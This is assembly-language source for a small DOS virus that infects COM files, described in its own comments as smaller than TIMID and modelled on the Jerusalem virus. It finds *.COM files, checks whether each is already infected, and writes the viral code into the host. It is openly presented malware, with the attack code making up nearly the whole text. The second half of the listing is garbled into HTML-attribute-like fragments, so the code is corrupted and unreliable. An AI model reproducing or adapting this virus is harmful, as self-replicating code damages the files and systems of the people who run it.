

;This is a completely different approach to a COM file infector. It is an
;attempt to write an even smaller virus than TIMID. The approach to infection
;is similar to how the Jerusalem virus works.

        .model tiny

        .code

        ORG     100H

START:
        mov     bp,OFFSET START
        mov     dx,OFFSET DTA           ;set new DTA
        mov     ah,1AH
        int     21H
        mov     ah,4EH                  ;find first
        mov     dx,OFFSET CFILE
;       xor     cx,cx                   ;leaving this out screws up an attempt to trace using DEBUG
        int     21H                     ;since debug sets cx=file length, versus dos setting cx=0
FCFLP:  jc      EXIT_VIRUS              ;exit on error
        call    FILE_OPEN               ;open the file to check

        mov     ah,3FH
        mov     dx,OFFSET FBUF
        mov     cl,5                    ;ch=0 already from above
        int     21H                     ;read 5 bytes

        mov     di,dx                   ;DOS leaves dx=OFFSET FBUF
        mov     si,bp
        repz    cmpsb                   ;compare 5 bytes read with start of this program
        jnz     INFECT_FILE             ;different, so clear carry to signal time to infect

        mov     ah,3EH                  ;close file
        int     21H
        mov     ah,4FH                  ;find next
        int     21H
        jmp     SHORT FCFLP

INFECT_FILE:
        call    RESET_FP

        mov     ax,ds
        add     ah,10H                  ;put es above this segment (including the stack)
        mov     es,ax
        mov     cx,OFFSET VIRUS_END - OFFSET START
        mov     si,bp
        mov     di,bp
        rep     movsb                   ;move the virus to that block

        mov     ds,ax
        mov     dx,di
        mov     ah,3FH
        dec     cx                      ;all COM files < 64k="" int="" 21h="" ;next="" read="" the="" file="" to="" that="" block="" add="" di,ax="" ;add="" bytes="" read="" to="" di="" mov="" word="" ptr="" [eh_ptr+1],di="" ;set="" this="" pointer="" up="" in="" the="" infect="" file="" eh_ptr:="" mov="" si,offset="" exec_host="" ;this="" is="" the="" following="" instruction,="" coded="" as="" a="" db="" to="" make="" offset="" dynamic="" mov="" cx,(offset="" eh_end)="" -="" (offset="" exec_host)="" push="" ds="" push="" cs="" pop="" ds="" rep="" movsb="" ;move="" the="" exec_host="" routine="" call="" reset_fp="" pop="" ds="" exit_virus:="" mov="" ah,40h="" ;this'll="" give="" an="" error="" if="" the="" jump="" above="" came="" here,="" but="" so="" what!="" mov="" dx,bp="" mov="" cx,di="" dec="" ch="" ;subtract="" 100h="" from="" cx="" int="" 21h="" ;write="" the="" file,="" with="" virus,="" back="" to="" disk="" push="" cs="" pop="" ds="" push="" cs="" pop="" es="" mov="" ah,3eh="" ;close="" the="" file="" int="" 21h="" shr="" dx,1="" ;set="" dx="80H" mov="" ah,1ah="" int="" 21h="" jmp="" word="" ptr="" [eh_ptr+1]="" cfile="" db="" '*.com',0="" reset_fp:="" mov="" ah,3eh="" int="" 21h="" file_open:="" mov="" ax,3d02h="" ;open="" the="" file="" mov="" dx,offset="" fname="" int="" 21h="" mov="" bx,ax="" ret="" virus_end:="" host:="" ;this="" is="" a="" dummy="" host="" that="" just="" mov="" ax,4c00h="" ;exits="" to="" dos="" int="" 21h="" exec_host:="" call="" eh1="" eh1:="" pop="" cx="" ;cx="OFFSET" exec_host="" mov="" di,bp="" push="" di="" ;save="" 100h="" as="" return="" address="" mov="" si,offset="" virus_end="" sub="" cx,si="" ;move="" this="" many="" bytes="" rep="" movsb="" ret="" eh_end:="" org="" 0ff00h="" dta="" db="" 1ah="" dup="" (?)="" ;file="" search="" buffer="" fsize="" dd="" fname="" db="" 13="" dup="" (?)="" fbuf="" db="" 5="" dup="" (?)="" ;buffer="" for="" compare="" end="" start="" ="">